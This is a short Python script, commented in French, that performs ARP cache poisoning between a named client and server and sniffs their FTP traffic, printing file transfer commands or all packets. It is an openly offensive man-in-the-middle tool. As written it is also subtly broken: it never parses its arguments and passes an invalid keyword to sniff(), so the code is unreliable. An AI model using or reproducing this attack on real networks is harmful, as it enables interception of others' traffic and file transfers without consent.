from scapy.all import ARP, sniff, send
import threading
import time
import argparse
import sys

stop_event = threading.Event()

def arp_spoof(client_ip, client_mac, server_ip, server_mac):
    arp_response = ARP(pdst=client_ip, hwdst=client_mac, psrc=server_ip, op='is-at')  # Replacer l'adresse MAC du serveur par celle de l'attaquant
    arp_response2 = ARP(pdst=server_ip, hwdst=server_mac, psrc=client_ip, op='is-at')  # Replacer l'adresse MAC du client par celle de l'attaquant

    while not stop_event.is_set():
        send(arp_response, verbose=False)
        send(arp_response2, verbose=False)
        time.sleep(1)

def capture_ftp_traffic(pkt, verbose):
    if pkt.haslayer('TCP'):
        if pkt['TCP'].dport == 21 or pkt['TCP'].sport == 21: 
            if pkt.haslayer('Raw') and (verbose == True or (pkt['Raw'].load.decode().startswith('RETR') or pkt['Raw'].load.decode().startswith('STOR'))):
                print(pkt['Raw'].load.decode(errors='ignore'))

def main():

    arg = argparse.ArgumentParser()
    arg.add_argument("client_ip", help = "client IP address")
    arg.add_argument("client_mac", help = "client MAC address")
    arg.add_argument("server_ip", help = "server IP address")
    arg.add_argument("server_mac", help = "server MAC address")
    arg.add_argument("-v", "--verbose", help = "view all packets", action = "store_true")

    # ARP dans un thread séparé
    arp_thread = threading.Thread(target=arp_spoof, args=(arg.client_ip, arg.client_mac, arg.server_ip, arg.server_mac))
    arp_thread.start()

    # Sniffer le trafic FTP
    try:
        sniff(filter="tcp port 21", prn=capture_ftp_traffic, arg=(arg.verbose), stop_filter=lambda x: stop_event.is_set())
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        print("\nRestauration des adresses MAC...")
        # Restaurer les adresses MAC
        arp_response = ARP(pdst=arg.client_ip, hwdst=arg.client_mac, psrc=arg.server_ip, hwsrc=arg.server_mac, op='is-at')
        arp_response2 = ARP(pdst=arg.server_ip, hwdst=arg.server_mac, psrc=arg.client_ip, hwsrc=arg.client_mac, op='is-at')
        send(arp_response, verbose=False)
        send(arp_response2, verbose=False)
        arp_thread.join()

if __name__ == "__main__":
    main()
